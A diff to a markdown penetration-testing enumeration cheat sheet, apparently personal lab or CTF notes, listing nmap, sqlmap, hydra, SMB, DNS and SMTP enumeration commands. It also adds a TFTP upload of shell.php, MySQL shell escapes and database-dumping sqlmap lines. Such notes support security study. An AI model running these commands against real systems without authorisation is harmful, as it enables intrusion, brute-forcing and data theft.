@@ -1,5 +1,36 @@
 # Enum
 
+## Table of Content
+
+---
+
+- [Enum](#enum)
+  - [Table of Content](#table-of-content)
+  - [Scanning](#scanning)
+  - [FTP(21)](#ftp21)
+  - [TFTP](#tftp)
+  - [SSH(22)](#ssh22)
+  - [SMPT(25)](#smpt25)
+  - [DNS(53)](#dns53)
+    - [Windows](#windows)
+  - [RCP(135)](#rcp135)
+  - [Netbios(137)](#netbios137)
+  - [SMB(139,445)](#smb139445)
+  - [LDAP(389)](#ldap389)
+  - [Web(80,443)](#web80443)
+  - [SNMP(161,162)](#snmp161162)
+    - [SNMP MIB Trees](#snmp-mib-trees)
+  - [MsSQL(1433)](#mssql1433)
+  - [Wordpress](#wordpress)
+  - [NFS(2049)](#nfs2049)
+  - [mySQL(3306)](#mysql3306)
+  - [Remote Desktop Service(3389)](#remote-desktop-service3389)
+  - [Random port](#random-port)
+  - [Brute Forcing](#brute-forcing)
+  - [Password List](#password-list)
+
+
+
 ## Scanning
 
 ---
@@ -23,6 +54,23 @@ Other useful flags:
 **-sn** : Disable port scan(Used when scanning for active hosts)
 
 **-n** : No dns resolution
+
+`Automated script`
+
+```bash
+#!/bin/bash
+nmap $1 -F -oN $2/nmap/quick_nmap                 # first, quick scan
+nmap -sV -A -O -T4 -sC $1 -oN $2/nmap/nmap  # verify services, Os, run scripts
+nmap -p 1-65535 -T5 -sT $1 -oN $2/nmap/all_port_nmap # scan all ports TCP
+nmap -p 1-10000 -T4 -Su $1 -oN $2/nmap/udp_nmap # UDP scan
+```
+
+`Full vulnerability scanning`
+
+```bash
+
+mkdir /usr/share/nmap/scripts/vulnscan; cd /usr/share/nmap/scripts/vulnscan; git clone https://github.com/scipag/vulscan.git; nmap -sS -sV --script=/usr/share/nmap/scripts/vulnscan/vulscan.nse $ip
+```
 
 ---
 
@@ -49,6 +97,19 @@ Metasploit Modules for FTP service;
 - auxiliary/scanner/ftp/ftp_version
 - auxiliary/scanner/ftp/konica_ftp_traversal
 
+## TFTP
+
+---
+
+```bash
+$ tftp $ip
+tftp> ls
+?Invalid command
+tftp> verbose
+Verbose mode on.
+tftp> put shell.php
+Sent 3605 bytes in 0.0 seconds [inf bits/sec]
+```
 
 ## SSH(22)
 
@@ -76,6 +137,14 @@ Metasploit Modules for SSH service
 ---
 > nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn $IP
 
+> smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
+
+`Command to check if a user exists`
+> VRFY root
+
+`Command to ask the server if a user belongs to a mailing list`
+> EXPN root
+
 Metasploit Modules for SMTP service;
 
 - auxiliary/scanner/smtp/smtp_enum
@@ -86,11 +155,27 @@ Metasploit Modules for SMTP service;
 ## DNS(53)
 
 ---
+Zone transfer request
 > dnsrecon -d $IP -t axfr
 > 
 > host -l test.com ns1.test.com
+
+Find nameservers for a given domain
+> dnsenum test.com
 > 
+> host -t ns test.com | cut -d " " -f 4 #
+
 > dig axfs test.com @ns1.test.com
+
+Find server names
+> host -t ns test.com
+
+Find email servers
+> host -t mx test.com
+
+Reverse dns lookup bruteforceing
+> for ip in $(seq 155 190); do host 192.168.67.$ip;done | grep -v "not found"
+
 
 ### Windows
 > nslookup -> set type=any -> ls -d test.com
@@ -107,6 +192,13 @@ Metasploit Exploit Module for Microsoft RPC service;
 
 - exploit/windows/dcerpc/ms05_017_msmq
 
+## Netbios(137)
+
+---
+`Dumping the netbios table`
+> nmap -Pn -sUC -p137 $ip
+
+---
 
 ## SMB(139,445)
 
@@ -116,6 +208,10 @@ Metasploit Exploit Module for Microsoft RPC service;
 > nbtscan $IP
 
 > nmblookup -A $IP
+
+`Null session and extract information`
+
+> nbtscan -r $ip
 
 > nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smbv2-enabled,smbv2-enabled,smb-vuln* $IP
 >
@@ -146,9 +242,14 @@ Metasploit Modules for Microsoft SMB service;
 - auxiliary/scanner/smb/smb_ms17_010
 - auxiliary/scanner/smb/smb_version
 
-
 Use `get` to download file
 > get file-name
+
+`Bruteforce`
+> hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 $ip smb
+
+Any metasploit exploit through Netbios over TCP in 139, you need to set:
+> set SMBDirect false
 
 ## LDAP(389)
 
@@ -171,6 +272,21 @@ Use `get` to download file
 
 > sqlmap -u http://$IP/ --crawl=5 --dbms=mysql
 
+Get all databases
+> sqlmap -u 10.10.42.154/administrator.php --data "username=&password=" --dbs --dump
+
+Get all tables
+> sqlmap -u 10.10.42.154/administrator.php --data "username=&password=" -D users --tables --dump
+
+Get all content of a table
+> sqlmap -u 10.10.42.154/administrator.php --data "username=&password=" -D users -T users --dump
+
+Use burp request
+> sqlmap -r request.txt -p email,password
+
+URL params
+> sqlmap -u "http://$ip/?query" --data="user=foo&pass=bar&submit=Login" --level=5 --risk=3 --dbms=mysql
+
 Create a wordlist from the provided url
 > cewl http://$IP/ -m 6 -w special_wordlist.txt
 
@@ -183,7 +299,20 @@ Brute-force login page
 
 > sslscan https://$IP/
 
-## SNMP Enumeartion(161,162)
+`Basic SSL ciphers check`
+
+```bash
+nmap --script ssl-enum-ciphers -p 443 $ip
+```
+
+- Look for unsafe ciphers such as Triple-DES and Blowfish
+- Very complete tool for SSL auditing is testssl.sh, finds BEAST, FREAK, POODLE, heart bleed
+
+`Banner grabbing`
+
+> ./whatweb $ip # identifies all known services
+
+## SNMP(161,162)
 
 ---
 > nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat $IP
@@ -236,7 +365,6 @@ Metasploit Modules for MsSQL service;
 - auxiliary/admin/mssql/mssql_exec
 - auxiliary/admin/mssql/mssql_enum
 
-
 ## Wordpress
 
 ---
@@ -248,7 +376,7 @@ Metasploit Modules for MsSQL service;
 **u**: For users
 **ap**: For plugins
 
-## NNFS(2049)
+## NFS(2049)
 
 ---
 > nmap --script=nfs-ls $IP
@@ -277,6 +405,10 @@ Upload a shell
 
 > myysql> \! /bin/bash
 
+> mysql> select do_system('id');
+> 
+> mysql> \! sh
+
 ```file-path example: /var/www/https/blog/wp-content/uploads/backdoor.php```
 
 Metasploit Modules for MySQL service;
@@ -302,7 +434,7 @@ Metasploit Modules for Remote Desktop service;
 - auxiliary/scanner/rdp/rdp_scanner 
 
 
-## Random port or service
+## Random port
 
 ---
 > netcat $IP $port
@@ -327,24 +459,9 @@ Metasploit Modules for Remote Desktop service;
 Wordpress user bruteforce
 > wpscan --url url --disable-tls-check --usernames user-file --wordlist password-file --log dir
 
-
 ## Password List
 
 ---
-| darkc0de.txt |
-----------------
 
-
-## H2
-
-### H3
-
-**Text** BOLD
-
-- FOR list
-  
-> FOR indentation
-
-[<TEXT>](link) FOR Hyperlinks
-
-![<TEXT>](link) FOR images
+- darkc0de.txt
+- Rockyou.txt
